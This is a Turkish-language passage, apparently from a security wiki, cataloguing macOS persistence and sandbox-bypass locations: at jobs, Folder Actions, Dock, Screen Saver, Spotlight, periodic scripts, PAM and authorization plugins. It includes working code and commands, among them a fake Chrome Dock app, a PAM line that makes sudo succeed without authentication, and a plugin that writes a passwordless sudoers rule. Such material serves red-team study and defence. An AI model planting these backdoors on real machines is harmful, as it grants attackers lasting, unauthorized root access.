Başka bir seçenek, kullanıcı HOME dizininin içine **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır. Böylece LaunchAgents klasörü zaten mevcutsa bu teknik yine çalışır.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak **`at`** komutunu **çalıştırmanız** ve bunun **etkinleştirilmiş** olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** komutunu **çalıştırmanız** ve bunun **etkinleştirilmiş** olması gerekir

#### **Description**

`at` görevleri, belirli zamanlarda çalıştırılacak **tek seferlik görevleri zamanlamak** için tasarlanmıştır. cron jobs'ların aksine, `at` görevleri çalıştırıldıktan sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmalarında kalıcı olduğunu belirtmek önemlidir; bu durum, belirli koşullar altında onları potansiyel güvenlik sorunları hâline getirir.

**Varsayılan olarak** devre dışıdır; ancak **root** kullanıcısı bunları şu komutla **etkinleştirebilir**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacaktır:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
İş kuyruğunu `atq` kullanarak kontrol edin:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda zamanlanmış iki iş görebiliriz. `at -c JOBNUMBER` kullanarak işin ayrıntılarını yazdırabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks etkinleştirilmemişse oluşturulan tasks yürütülmez.

**job dosyaları** `/private/var/at/jobs/` konumunda bulunabilir.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı queue’yu, job numarasını ve çalışmasının zamanlandığı zamanı içerir. Örnek olarak `a0001a019bdcd2` değerine bakalım.

- `a` - queue
- `0001a` - hex biçiminde job numarası, `0x1a = 26`
- `019bdcd2` - hex biçiminde zaman. Epoch’tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, decimal biçiminde `26991826` değeridir. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. April 27., Tuesday 7:46:00` tarihine karşılık gelir.

Job dosyasını yazdırırsak, `at -c` kullanarak elde ettiğimiz bilgilerin aynısını içerdiğini görürüz.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Sandbox’ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak Folder Actions’ı yapılandırabilmek için **`System Events`** ile iletişim kuracak şekilde `osascript`’i argümanlarla çağırabilmeniz gerekir
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir

#### Konum

- **`/Library/Scripts/Folder Action Scripts`**
- Root gereklidir
- **Trigger**: Belirtilen folder’a erişim
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Belirtilen folder’a erişim

#### Açıklama ve Exploitation

Folder Actions; öğelerin eklenmesi, kaldırılması veya folder penceresinin açılması ya da yeniden boyutlandırılması gibi diğer işlemler dahil olmak üzere, bir folder’da meydana gelen değişikliklerle otomatik olarak tetiklenen script’lerdir. Bu actions çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları gibi farklı yöntemlerle tetiklenebilir.

Folder Actions’ı ayarlamak için şu seçeneklere sahipsiniz:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action workflow’u oluşturup bunu service olarak yüklemek.
2. Bir folder’ın context menu’sündeki Folder Actions Setup üzerinden manuel olarak bir script bağlamak.
3. Programatik olarak bir Folder Action ayarlamak için OSAScript kullanarak `System Events.app`’e Apple Event mesajları göndermek.
- Bu yöntem, action’ı system’e gömmek ve bir persistence seviyesi sağlamak için özellikle kullanışlıdır.

Aşağıdaki script, bir Folder Action tarafından çalıştırılabilecek işlemlere örnektir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki script'i Folder Actions tarafından kullanılabilir hale getirmek için şu komutu kullanarak derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script derlendikten sonra aşağıdaki script'i çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı global olarak etkinleştirir ve daha önce derlenmiş script'i özellikle Desktop klasörüne bağlar.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Kurulum script'ini şu komutla çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Bu, bu persistence yönteminin GUI aracılığıyla uygulanma şeklidir:

Bu çalıştırılacak script'tir:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Şu komutla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`

Şuraya taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ardından `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve kendi durumunuzda **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi bu klasörü **Finder** ile açarsanız script'iniz çalıştırılır.

Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumunda bulunan **plist** dosyasında saklanır.

Şimdi bu persistence işlemini GUI erişimi olmadan hazırlamayı deneyelim:

1. Yedeklemek için **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını `/tmp` konumuna **kopyalayın**:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Az önce ayarladığınız Folder Actions'ı **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Artık boş bir ortamımız olduğuna göre

3. Yedek dosyasını kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı yüklemek için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bu işlem bende çalışmadı, ancak writeup'taki talimatlar bunlar:(

### Dock kısayolları

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Sandbox'ı bypass etmek için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak sisteme kötü amaçlı bir uygulama yüklemiş olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Kullanıcı Dock içindeki uygulamaya tıkladığında

#### Açıklama ve Exploitation

Dock'ta görünen tüm uygulamalar **`~/Library/Preferences/com.apple.dock.plist`** içinde belirtilir.

Sadece şu komutla **bir uygulama eklemek** mümkündür:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Bir miktar **social engineering** kullanarak **örneğin Google Chrome'u** Dock içinde taklit edebilir ve kendi script'inizi çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Çok spesifik bir action gerçekleşmesi gerekir
- Başka bir sandbox içinde sonlanırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
- Root gerekir
- Trigger: Color picker'ı kullanın
- `~/Library/ColorPickers`
- Trigger: Color picker'ı kullanın

#### Açıklama & Exploit

Kodunuzu içeren bir **color picker** bundle'ı ([örneğin bunu](https://github.com/viktorstrate/color-picker-plus) kullanabilirsiniz) **Compile** edin, bir constructor ekleyin ([Screen Saver bölümündeki](macos-auto-start-locations.md#screen-saver) gibi) ve bundle'ı `~/Library/ColorPickers` konumuna kopyalayın.

Ardından, color picker tetiklendiğinde kodunuz da çalıştırılmalıdır.

Library'nizi yükleyen binary'nin **çok kısıtlayıcı bir sandbox** kullandığını unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Sandbox bypass için kullanışlı: **Hayır, çünkü kendi uygulamanızı execute etmeniz gerekir**
- TCC bypass: ???

#### Konum

- Belirli bir uygulama

#### Açıklama ve Exploit

Finder Sync Extension içeren bir uygulama örneği [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Sync Extensions` içerebilir. Bu extension, execute edilecek bir uygulamanın içine yerleştirilir. Ayrıca extension'ın kendi kodunu execute edebilmesi için **geçerli bir Apple developer certificate ile imzalanmış olması**, **sandboxed** olması (rahatlatılmış istisnalar eklenebilmesine rağmen) ve aşağıdakine benzer bir şeyle register edilmesi gerekir:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- sandbox'u bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak common application sandbox içinde sonlanırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
- Root gerekir
- **Trigger**: Screen Saver'ı seçin
- `/Library/Screen Savers`
- Root gerekir
- **Trigger**: Screen Saver'ı seçin
- `~/Library/Screen Savers`
- **Trigger**: Screen Saver'ı seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Exploit

Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak için şablonu seçin. Ardından kodunuzu ekleyin; örneğin aşağıdaki kod loglar oluşturur.

**Derleyin** ve `.saver` bundle'ını **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Screen Saver GUI'sini açın ve üzerine tıklamanız yeterli; çok sayıda log oluşturması gerekir:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ları içinde **`com.apple.security.app-sandbox`** bulunduğundan, **common application sandbox'ın içinde olacağınızı** unutmayın.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak bir application sandbox içinde kalırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Sandbox oldukça kısıtlı görünüyor

#### Konum

- `~/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
- `/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekir
- `/System/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekir
- `Some.app/Contents/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
- Yeni bir app gerekir

#### Açıklama ve Exploitation

Spotlight, kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmış, macOS'un yerleşik arama özelliğidir.\
Bu hızlı arama özelliğini kolaylaştırmak için Spotlight, **özel bir veritabanı** tutar ve **çoğu dosyayı ayrıştırarak** bir index oluşturur; böylece hem dosya adları hem de içerikleri arasında hızlı arama yapılabilir.

Spotlight'ın temel mekanizması, **'metadata server'** anlamına gelen 'mds' adlı merkezi bir process içerir. Bu process, Spotlight servisinin tamamını yönetir. Buna ek olarak, farklı dosya türlerini indexlemek gibi çeşitli bakım görevlerini gerçekleştiren birden fazla 'mdworker' daemon'ı bulunur (`ps -ef | grep mdworker`). Bu görevler, Spotlight importer plugin'leri veya Spotlight'ın çok çeşitli dosya formatlarındaki içeriği anlamasını ve indexlemesini sağlayan **".mdimporter bundles"** aracılığıyla gerçekleştirilir.

Plugin'ler veya **`.mdimporter`** bundle'ları daha önce belirtilen konumlarda bulunur ve yeni bir bundle ortaya çıktığında bir dakika içinde yüklenir (herhangi bir servisi yeniden başlatmaya gerek yoktur). Bu bundle'ların **hangi dosya türlerini ve uzantılarını yönetebileceklerini belirtmeleri** gerekir; böylece Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanır.

Yüklü olan tüm `mdimporters`'ları şu komutla bulmak mümkündür:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, bu tür dosyaları (diğerlerinin yanı sıra `.iba` ve `.book` uzantılı dosyaları) ayrıştırmak için kullanılır:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Diğer `mdimporter` öğelerinin Plist'ini kontrol ederseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesinin gerekmemesidir.
>
> Ayrıca, System default plugin'leri her zaman önceliklidir; bu nedenle bir saldırgan yalnızca Apple'ın kendi `mdimporter`'ları tarafından başka şekilde indexlenmeyen dosyalara erişebilir.

Kendi importer'ınızı oluşturmak için şu projeyle başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer); ardından adı, **`CFBundleDocumentTypes`** değerini değiştirin ve desteklemek istediğiniz uzantıyı desteklemesi için **`UTImportedTypeDeclarations`** ekleyin; bunları **`schema.xml`** içinde yansıtın.\
Ardından, işlenen uzantıya sahip bir dosya oluşturulduğunda payload'unuzu çalıştırması için **`GetMetadataForFile`** fonksiyonunun kodunu **değiştirin**.

Son olarak yeni **`.mdimporter`** dosyanızı build edip önceki konumlardan birine kopyalayın; ardından **log'ları izleyerek** veya **`mdimport -L.`** komutunu kontrol ederek ne zaman yüklendiğini kontrol edebilirsiniz.

### ~~Preference Pane~~

> [!CAUTION]
> Bunun artık çalışıyor gibi görünmediğini unutmayın.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Belirli bir kullanıcı eylemi gerektirir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Bunun artık çalışıyor gibi görünmediğini unutmayın.

## Root Sandbox Bypass

> [!TIP]
> Burada, **root** olarak **bir dosyaya yazarak** bir şeyi basitçe çalıştırmanıza olanak tanıyan ve/veya başka **tuhaf koşullar** gerektiren **sandbox bypass** için kullanışlı start location'ları bulabilirsiniz.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root gereklidir
- **Trigger**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
- Root gereklidir
- **Trigger**: Zamanı geldiğinde

#### Description & Exploitation

Periodic script'leri (**`/etc/periodic`**), `/System/Library/LaunchDaemons/com.apple.periodic*` içinde yapılandırılmış **launch daemon**'ları nedeniyle çalıştırılır. `/etc/periodic/` içinde depolanan script'lerin **dosyanın sahibi** olarak çalıştırıldığını unutmayın; bu nedenle bu yöntem olası bir privilege escalation için çalışmaz.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** içinde belirtilen ve çalıştırılacak başka periodic scriptler de vardır:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
`/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birini yazmayı başarırsanız, bu dosya **er ya da geç çalıştırılır**.

> [!WARNING]
> Periodic script'in, **script'in sahibi olarak çalıştırılacağını** unutmayın. Bu nedenle script'in sahibi normal bir kullanıcıysa, script o kullanıcı olarak çalıştırılır (bu durum privilege escalation saldırılarını engelleyebilir).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Sandbox'ı bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Her zaman root gerekir

#### Description & Exploitation

PAM, macOS içinde kolay çalıştırmadan ziyade **persistence** ve malware üzerine odaklandığından, bu blog ayrıntılı bir açıklama sunmayacaktır; **bu tekniği daha iyi anlamak için writeup'ları okuyun**.

PAM modüllerini şu komutla kontrol edin:
```bash
ls -l /etc/pam.d
```
PAM'i kötüye kullanan bir persistence/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirip başlangıcına şu satırı eklemek kadar kolaydır:
```bash
auth       sufficient     pam_permit.so
```
Yani **şuna benzeyecek**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Ve bu nedenle **`sudo` kullanma girişimleri başarılı olacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu unutmayın; bu nedenle kullanıcının erişim isteyen bir istem alması oldukça olasıdır.

Bir diğer güzel örnek `su`'dur; burada PAM modules'a parametreler vermenin de mümkün olduğunu görebilirsiniz (ayrıca bu dosyaya backdoor da ekleyebilirsiniz):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve ek config'ler yapmanız gerekir
- TCC bypass: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
- Root gerekir
- Plugin'i kullanacak şekilde authorization database'i yapılandırmak da gerekir

#### Açıklama ve Exploitation

Persistence sağlamak amacıyla kullanıcı giriş yaptığında çalıştırılacak bir authorization plugin oluşturabilirsiniz. Bu plugin'lerden birinin nasıl oluşturulacağı hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; kötü yazılmış bir plugin sisteminize erişiminizi engelleyebilir ve Mac'inizi recovery mode'dan temizlemeniz gerekebilir).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Taşıyın** bundle'ı yükleneceği konuma:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Son olarak bu **Plugin**'i yüklemek için **rule**'u ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
